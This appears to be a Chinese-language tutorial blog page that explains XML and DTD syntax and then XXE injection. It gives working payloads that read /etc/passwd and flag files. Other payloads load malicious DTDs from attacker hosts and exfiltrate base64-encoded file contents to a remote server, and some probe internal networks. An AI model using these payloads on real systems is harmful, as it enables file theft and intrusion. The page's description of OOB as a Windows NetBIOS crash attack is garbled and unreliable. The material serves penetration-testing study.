HTML 之间的差异</h4><p>XML 被设计用来<u>传输和存储数据</u>，其焦点是数据的内容。</p><p>HTML 被设计用来<u>显示数据</u>，其焦点是数据的外观。</p><h4 id="XML-用途"><a href="#XML-用途" class="headerlink" title="XML 用途"></a>XML 用途</h4><p>XML 把数据从 HTML 分离<br>XML 简化数据共享<br>XML 简化数据传输<br>XML 简化平台变更<br>XML 用于创建新的互联网语言</p><h4 id="XML-树结构"><a href="#XML-树结构" class="headerlink" title="XML 树结构"></a>XML 树结构</h4><p>XML 文档形成了一种树结构，它从”根部”开始，然后扩展到”枝叶”。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>第一行是 XML 声明。它定义 XML 的版本（1.0）和所使用的编码（UTF-8 : 万国码, 可显示各种语言）;</p><p>下一行<code>&lt;note&gt;</code>描述文档的<strong>根元素</strong>（像在说：“本文档是一个便签”）;</p><p>接下来 4 行描述根的 4 个子元素（to, from, heading 以及 body）</p><p><strong>注意</strong>：<em>XML 文档必须包含根元素。该元素是所有其他元素的父元素。</em></p><p>XML 文档中的元素形成了一棵文档树。这棵树从根部开始，并扩展到树的最底端。所有的元素都可以有子元素。</p><h4 id="XML语法"><a href="#XML语法" class="headerlink" title="XML语法"></a>XML语法</h4><ol><li><p><strong>XML 必须包含根元素，它是所有其他元素的父元素</strong></p></li><li><p><strong>XML 声明文件的可选部分，如果存在需要放在文档的第一行</strong></p><p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code></p></li><li><p><strong>所有的 XML 元素都必须有一个关闭标签</strong>，在 HTML 中，某些元素的关闭标签不是必须的，比如<code>&lt;p&gt;</code>。</p></li><li><p><strong>XML 标签对大小写敏感</strong></p></li><li><p><strong>XML 必须正确嵌套</strong>，也就是标签的嵌套顺序要正确。</p><p><code>&lt;b&gt;&lt;i&gt;This text is bold and italic&lt;/i&gt;&lt;/b&gt;</code></p></li><li><p><strong>XML 属性值必须加引号</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;note date=&quot;12/11/2007&quot;&gt;</span><br><span class="line">&lt;to&gt;Tove&lt;/to&gt;</span><br><span class="line">&lt;from&gt;Jani&lt;/from&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure></li><li><p><strong>实体引用</strong></p><p>在 XML 中，一些字符拥有特殊的意义</p><p>在 XML 中，有 5 个预定义的实体引用:</p></li></ol><table><thead><tr><th><code>&amp;lt;</code></th><th>&lt;</th><th>less than</th></tr></thead><tbody><tr><td><code>&amp;gt;</code></td><td>&gt;</td><td>greater than</td></tr><tr><td><code>&amp;amp;</code></td><td>&amp;</td><td>ampersand</td></tr><tr><td><code>&amp;apos;</code></td><td>’</td><td>apostrophe</td></tr><tr><td><code>&amp;quot;</code></td><td>“</td><td>quotation mark</td></tr></tbody></table><ol start="8"><li><p><strong>XML 中的注释</strong></p><p><code>&lt;!-- This is a comment --&gt;</code></p></li><li><p><strong>在 XML 中，空格会被保留</strong></p><p>但是 HTML 会把多个连续的空格字符裁减（合并）为一个：</p></li><li><p><strong>XML 以 LF 存储换行</strong></p><p>在 Windows 应用程序中，换行通常以一对字符来存储：<strong>回车符（CR）和换行符（LF）</strong>。</p><p>在 Unix 和 Mac OSX 中，使用 <strong>LF</strong> 来存储新行。</p><p>在旧的 Mac 系统中，使用 <strong>CR</strong> 来存储新行。</p><p>XML 以 <strong>LF</strong> 存储换行。</p></li><li><p><strong>XML 元素</strong></p><p>XML 元素指的是从（且包括）开始标签直到（且包括）结束标签的部分。XML 元素是可扩展的。</p><p>比如<code>&lt;body&gt;Don&#39;t forget me this weekend!&lt;/body&gt;</code>。</p></li><li><p><strong>XML 属性</strong></p><p>XML元素具有属性，类似 HTML。属性（Attribute）提供有关元素的额外信息。</p><p>属性通常提供不属于数据组成部分的信息。在下面的实例中，文件类型与数据无关，但是对需要处理这个元素的软件来说却很重要。</p><p>比如：<code>&lt;file type=&quot;gif&quot;&gt;computer.gif&lt;/file&gt;</code>、<code>&lt;img src=&quot;computer.gif&quot; /&gt;</code>。</p><p><strong>XML 属性必须加引号</strong></p><ul><li>属性不能包含多个值（元素可以）</li><li>属性不能包含树结构（元素可以）</li><li>属性不容易扩展（为未来的变化）</li></ul><p>属性难以阅读和维护。请尽量使用元素来描述数据。而仅仅使用属性来提供与数据无关的信息。</p></li></ol><h3 id="DTD简介"><a href="#DTD简介" class="headerlink" title="DTD简介"></a>DTD简介</h3><p>文档类型定义（DTD）可<strong>定义合法的XML文档构建模块</strong>。它使用一系列合法的元素来<strong>定义文档的结构</strong>。 </p><p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p><h4 id="XML内部的-DOCTYPE-声明"><a href="#XML内部的-DOCTYPE-声明" class="headerlink" title="XML内部的 DOCTYPE 声明"></a>XML内部的 DOCTYPE 声明</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Tove&lt;/to&gt;</span><br><span class="line">&lt;from&gt;Jani&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget me this weekend&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><h4 id="外部文档声明"><a href="#外部文档声明" class="headerlink" title="外部文档声明"></a>外部文档声明</h4><p>假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</p><p>XML中定义 DOCTYPE 的语法：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root-element</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;filename&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>比如，有如下note元素，其中第一行代码表示note元素的DTD声明：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Tove&lt;/to&gt;</span><br><span class="line">&lt;from&gt;Jani&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget me this weekend&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><p>note.dtd文件的内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><h4 id="实体声明"><a href="#实体声明" class="headerlink" title="实体声明"></a>实体声明</h4><p><strong>dtd中的实体是用来定义普通文本的变量。</strong>可分为一般实体和参数实体</p><ol><li><p>一般实体的声明语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名 &quot;实体内容&quot;&gt;</span><br></pre></td></tr></table></figure><p>引用实体的方式： <strong><code>&amp;实体名;</code></strong></p></li><li><p>参数实体<strong>只能在DTD中使用</strong>，参数实体的声明格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名 &quot;实体内容&quot;&gt;</span><br></pre></td></tr></table></figure><p>引用实体的方式： <strong><code>%实体名;</code></strong></p></li></ol><h4 id="内部实体声明"><a href="#内部实体声明" class="headerlink" title="内部实体声明"></a>内部实体声明</h4><p><strong>dtd中的实体被声明为内部字符数据（普通文本）</strong></p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY entity-name &quot;entity-value&quot;&gt;</span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DTD 的实体:</span><br><span class="line">&lt;!ENTITY writer &quot;Donald Duck.&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright &quot;Copyright runoob.com&quot;&gt;</span><br><span class="line"></span><br><span class="line">XML 实例：</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure><h4 id="外部实体声明"><a href="#外部实体声明" class="headerlink" title="外部实体声明"></a>外部实体声明</h4><p><strong>dtd中的实体被声明为远程&#x2F;外部文本文件</strong></p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY entity-name SYSTEM &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DTD 的实体:</span><br><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.runoob.com/entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.runoob.com/entities.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">XML 实例:</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure><h4 id="PCDATA-简介"><a href="#PCDATA-简介" class="headerlink" title="PCDATA 简介"></a>PCDATA 简介</h4><p>PCDATA 的意思是被解析的<strong>字符数据</strong>（parsed character data）。可把字符数据想象为 XML 元素的开始标签与结束标签之间的文本。</p><p>PCDATA 是<strong>会被解析器解析的文本</strong>。这些文本将被解析器检查实体以及标记。</p><p>文本中的标签会被当作标记来处理，而实体会被展开。不过，被解析的字符数据不应当包含任何 &amp;、&lt; 或者 &gt; 字符；需要使用 &amp;、&lt; 以及 &gt; 实体来分别替换它们。</p><h4 id="CDATA简介"><a href="#CDATA简介" class="headerlink" title="CDATA简介"></a>CDATA简介</h4><p>CDATA 的意思是<strong>字符数据</strong>（character data）。</p><p>CDATA 是<strong>不会被解析器解析的文本</strong>。在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</p><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p> XXE 漏洞全称XML External Entity Injection，即 XML 外部实体注入漏洞，XXE 漏洞发生<strong>在应用程序解析 XML 输入时，没有禁止外部实体的加载，导致可加载恶意外部文件</strong>，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。</p><h3 id="漏洞位置"><a href="#漏洞位置" class="headerlink" title="漏洞位置"></a>漏洞位置</h3><p>xxe漏洞触发的点往往是<strong>可以上传xml文件的位置，没有对上传的xml文件进行过滤</strong>，导致可上传恶意 xml文件。</p><h2 id="XXE-攻击方式"><a href="#XXE-攻击方式" class="headerlink" title="XXE 攻击方式"></a>XXE 攻击方式</h2><h3 id="构建外部实体注入方法"><a href="#构建外部实体注入方法" class="headerlink" title="构建外部实体注入方法"></a>构建外部实体注入方法</h3><h4 id="直接通过DTD外部实体声明"><a href="#直接通过DTD外部实体声明" class="headerlink" title="直接通过DTD外部实体声明"></a>直接通过<u>DTD外部实体</u>声明</h4><p><u>在XML文档内直接声明外部实体。</u></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd/&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</span><br></pre></td></tr></table></figure><h4 id="先引入外部DTD文档，再引入外部实体声明"><a href="#先引入外部DTD文档，再引入外部实体声明" class="headerlink" title="先引入外部DTD文档，再引入外部实体声明"></a>先引入<u>外部DTD文档</u>，再引入<u>外部实体</u>声明</h4><p><u>在XML文档内直接引入外部文档，再在外部文档内引入外部实体。</u></p><p>XML 文件内容（包含DTD外部文档）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a SYSTEM &quot;http://mark4z5.com/evil.dtd&quot;&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</span><br></pre></td></tr></table></figure><p>evil.dtd 文件内容（包含外部实体）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd/&quot;&gt;</span><br></pre></td></tr></table></figure><h4 id="通过XML文档内部声明的DTD外部实体引入外部实体声明"><a href="#通过XML文档内部声明的DTD外部实体引入外部实体声明" class="headerlink" title="通过XML文档内部声明的DTD外部实体引入外部实体声明"></a><strong>通过XML文档内部声明的<u>DTD外部实体</u>引入<u>外部实体</u>声明</strong></h4><p><u>先在XML文档内引入一个外部实体声明，再在外部实体内引入一个在攻击者服务器上的外部实体。</u></p><p>先写一个外部实体声明，然后引用的是在攻击者服务器上面的外部实体声明。</p><p>XML 文件内容：</p><p><em>注意：在DTD内部使用的参数实体，使用<code>%实体</code></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY %d SYSTEM &quot;http://mark4z5.com/evil.dtd&quot;&gt;</span><br><span class="line">%d;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</span><br></pre></td></tr></table></figure><p>evil.dtd 文件内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd/&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="寻找-XML-输入点"><a href="#寻找-XML-输入点" class="headerlink" title="寻找 XML 输入点"></a>寻找 XML 输入点</h3><p><strong>甄别那些接受XML作为输入内容的端点。</strong> </p><p>但是有时候，这些端点可能并不是那么明显（比如，一些仅使用JSON去访问服务的客户端）。在这种情况下，渗透测试人员就必须<u>尝试不同的测试方式</u>，比如修改HTTP的请求方法，修改Content-Type头部字段为 <code>Content-Type：text/xml</code>等等方法，然后看看应用程序的响应，<u>看看程序是否解析了发送的内容</u>，如果解析了，那么则可能有XXE攻击漏洞。</p><p>例如：</p><p>判断wsdl（web服务描述语言），或者一些常见的采用xml的java服务配置文件（spring，struts2）。不过<u>现实中存在的大多数XXE漏洞都是blind，即不可见的，必须采用带外通道进行返回信息的记录</u>，这里简单来说就是攻击者必须具有一台具有公网ip的主机。</p><p>例如：</p><p>从PHP代码层面，存在 <code>Content-Type：text/xml</code> , 说明 post 的数据包含 XML 格式，如：可以在请求头中添加 <code>Content-Type:text/xml</code> 或 <code>Content-type:application/xml</code> ，然后构造payload测试是否存在XXE攻击漏洞。</p><h2 id="XXE-利用方式"><a href="#XXE-利用方式" class="headerlink" title="XXE 利用方式"></a>XXE 利用方式</h2><h3 id="1-文件读取有回显"><a href="#1-文件读取有回显" class="headerlink" title="1. 文件读取有回显"></a>1. 文件读取有回显</h3><p><strong>直接读靶机文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///d://test.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure><p><strong>通过恶意引入外部参数实体，读靶机文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;http://vps-ip/hack.dtd&quot;&gt;</span><br><span class="line">    %file;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;test&gt;&amp;hhh;&lt;/test&gt;</span><br></pre></td></tr></table></figure><p>hack.dtd的内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY hhh SYSTEM &#x27;file:///etc/passwd&#x27;&gt;</span><br></pre></td></tr></table></figure><h3 id="2-文件读取无回显（多数情况）"><a href="#2-文件读取无回显（多数情况）" class="headerlink" title="2. 文件读取无回显（多数情况）"></a>2. 文件读取无回显（多数情况）</h3><p>当读取文件无回显时，如何将文件内容取出？</p><h4 id="OOB攻击（把数据发送到远程服务器）"><a href="#OOB攻击（把数据发送到远程服务器）" class="headerlink" title="OOB攻击（把数据发送到远程服务器）"></a>OOB攻击（把数据发送到远程服务器）</h4><p>OOB的意思是“束缚数据脱离”，这是一种破坏Windows系统的过程。它通过向TCP端口139发送随机数来攻击操作系统，从而让中央处理器（CPU）一直处于繁忙状态。原理是利用Windows下微软网络协定NetBIOS的一个例外处理程序，简单说就是传递一个特别大的数据包导致系统死机。</p><p>常见的场景是通过XML实体漏洞来攻击。</p><p>**先使用<code>php://filter</code>获取目标文件的内容，然后将内容通过dtd外部文档以http请求发送到接受数据的服务器(攻击服务器)**，这样即使没有回显也能将数据带出。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://192.168.1.1:8080/test.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p><strong>test.dtd的内容，内部的%号要进行实体编码成<code>&amp;#x25;</code></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % payload</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://192.168.1.1:8080/?data=%file;&#x27;&gt;&quot;    &lt;!-- file中就是test.txt的内容 --&gt;</span><br><span class="line">&gt;</span><br><span class="line">%payload;</span><br></pre></td></tr></table></figure><p>payload的内容为<code>&lt;!ENTITY % send SYSTEM &#39;http://192.168.1.1:8080/?data=%file;&#39;&gt;</code></p><p>访问接受数据的服务器中的日志信息，可以看到经过base64编码过的数据，解码后便可以得到数据</p><h4 id="基于报错"><a href="#基于报错" class="headerlink" title="基于报错"></a>基于报错</h4><p>基于报错的原理和OOB类似，OOB通过构造一个带外的url将数据带出，而基于报错是<strong>构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据</strong>。所以和OOB的构造方式几乎只有url不同，其他地方一模一样。</p><ul><li><p><strong>引入服务器目标文件</strong></p><p>引入DTD外部实体声明，引入服务器目标文件file:&#x2F;&#x2F;&#x2F;flag，作为%file。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ENTITY % remote SYSTEM &quot;192.168.1.1:8080/xml.dtd&quot;&gt;    &lt;!-- 引入DTD外部实体声明 --&gt;</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;</span><br><span class="line">%remote;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;1234&lt;/message&gt;</span><br></pre></td></tr></table></figure><p>xml.dtd的内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;file:///hhhhhhh/%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%start;</span><br></pre></td></tr></table></figure><p>start 实体中嵌套了一层DTD外部实体 send，注意被嵌套的实体要进行HTML实体编码</p><p>访问<code>file:///hhhhhhh/%file;</code>报错，然后服务器会返回报错信息，但是该URL中包含%file，因此造成文件内容泄露。</p></li><li><h5 id="引入本地文件"><a href="#引入本地文件" class="headerlink" title="引入本地文件"></a>引入本地文件</h5><p>如果目标主机的防火墙十分严格，不允许我们请求外网服务器dtd呢？由于XML的广泛使用，其实在各个系统中已经存在了部分DTD文件。按照上面的理论，我们只要是<strong>从外部引入DTD文件，并在其中定义一些实体内容</strong>就行。</p><p><code>&amp;#x26;</code>为<code>&amp;</code>的HTML实体编码。</p><p><code>&amp;#x27;</code>为<code>&#39;</code>的HTML实体编码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;/usr/share/yelp/dtd/docbookx.dtd&quot;&gt;      &lt;!-- 引入本地dtd文件 --&gt;</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % ISOamso &#x27;</span><br><span class="line">&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;file://hhhhhhhh/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">&amp;#x25;eval;</span><br><span class="line">&amp;#x25;send;</span><br><span class="line">&#x27;&gt; </span><br><span class="line">%remote;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;1234&lt;/message&gt;</span><br></pre></td></tr></table></figure><p>ISOamso 实体中嵌套了一层DTD外部实体 eval，接着又嵌套了外部实体 send，注意被嵌套的实体要进行HTML实体编码，而 send 则被编码了两次。</p><p>ISOamso的第一行内容为<code>&lt;!ENTITY % eval &quot;&lt;!ENTITY % send SYSTEM &#39;file://hhhhhhhh/?%file;&#39;&gt;&quot;&gt;</code></p></li><li><h5 id="嵌套参数实体"><a href="#嵌套参数实体" class="headerlink" title="嵌套参数实体"></a>嵌套参数实体</h5><p>虽然W3C协议是不允许在内部的实体声明中引用参数实体，但是很多XML解析器并没有很好的执行这个检查。几乎所有XML解析器能够发现如下这种两层嵌套式的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;  </span><br><span class="line">    &lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://myip/?%file;&#x27;&gt;&quot;&gt;     &lt;!-- 在内部的实体声明中引用参数实体 --&gt;</span><br><span class="line">%start;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;10&lt;/message&gt;</span><br></pre></td></tr></table></figure></li><li><p><strong>基于报错的三层嵌套参数实体XXE</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">&lt;!ELEMENT message ANY&gt;</span><br><span class="line">&lt;!ENTITY % para1 SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % para &#x27;</span><br><span class="line">&lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">&amp;#x25;para2;</span><br><span class="line">&#x27;&gt;</span><br><span class="line">%para;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;10&lt;/message&gt;</span><br></pre></td></tr></table></figure><p>pare的第一行内容为<code>&lt;!ENTITY % para2 &quot;&lt;!ENTITY % error SYSTEM &#39;file:///%para1;&#39;&gt;&quot;&gt;</code></p></li></ul><h3 id="3-内网探测"><a href="#3-内网探测" class="headerlink" title="3. 内网探测"></a>3. 内网探测</h3><p>和读文件差不多，只不过把URI改成内网机器地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;        </span><br><span 